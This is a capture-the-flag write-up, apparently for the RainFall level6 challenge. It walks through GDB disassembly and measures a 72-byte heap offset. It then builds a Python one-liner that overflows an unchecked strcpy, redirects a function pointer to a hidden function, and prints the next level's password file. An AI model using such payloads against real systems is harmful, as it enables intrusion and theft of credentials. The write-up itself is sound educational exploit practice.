# Way to level7

When we enter `level6`, we can see `level6` executable file.

Let's give it a look with `gdb`.
```gdb
gdb) disassemble main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave  
   0x080484d3 <+87>:    ret    
End of assembler dump.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy
0x08048340  strcpy@plt
0x08048350  malloc
0x08048350  malloc@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  system
0x08048370  system@plt
0x08048380  __gmon_start__
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini
```
Normally, `main` calls only `m()`; `n()` has no caller, so this unused function is our attack target.
Let's disassemble `n()` and `m()` to see what's going on.
```gdb
(gdb) disassemble n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave  
   0x08048467 <+19>:    ret    
End of assembler dump.
(gdb) disass m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave  
   0x0804847b <+19>:    ret    
End of assembler dump.
```

For `n()`, it calls `system()` with a hardcoded string as an argument. For `m()`, it calls `puts()` with a hardcoded string as an argument.

`0x8048370` is called `system()` at runtime. So it can be used to execute arbitrary commands.
```gdb
x/s 0x80485b0
0x80485b0:       "/bin/cat /home/user/level7/.pass"
```
Calling `n()` will execute this fixed command and print the level7 password.
Let's make some payload to exploit this.

The heap overflow redirects a function pointer in three steps:

- `main` stores the address of `m()` (`0x8048468`) in `buf2`: `mov $0x8048468,%edx` at `<+41>` followed by `mov %edx,(%eax)` at `<+50>`.
- `strcpy(buf1, argv[1])` at `<+73>` has no length check, so input longer than the 64-byte `buf1` can overflow into the following `buf2`.
- At `<+78>`–`<+84>`, `main` loads `*buf2` into `%eax` and executes `call *%eax`. Overwriting the stored `m()` address with the `n()` address therefore executes `n()`; this is why `72 bytes of padding + n() address` works.

First of all, we need to find the distance between first malloc and second malloc.
We can do this by subtracting the address of the first malloc from the address of the second malloc.

```gdb
(gdb) b *0x080484a5
(gdb) run AAAA

(gdb) x/wx $esp+0x1c
0xbffff71c:     0x0804a008
(gdb) x/wx $esp+0x18
0xbffff718:     0x0804a050
```

The distance between first malloc and second malloc is `0x50 - 0x08 = 0x48 (72)` bytes.
Although `malloc(64)` requests 64 bytes, heap chunk headers and alignment make the distance between `buf1` and `buf2` larger; we measure it in GDB above rather than assume 64 bytes.
So payload should be at least `72` bytes long. And we have to add address of `n()`(`0x08048454`) to the payload.

Let's try it. `level6` takes a string as an argument (argv[1]). We can use `$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')` to generate the payload.
```bash
level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
REMOVED
```

As the `x/s` result shows, `n()` runs `system("/bin/cat /home/user/level7/.pass")` directly, so no `cat ... -` trick is needed to keep stdin open, unlike level5's interactive `/bin/sh`.
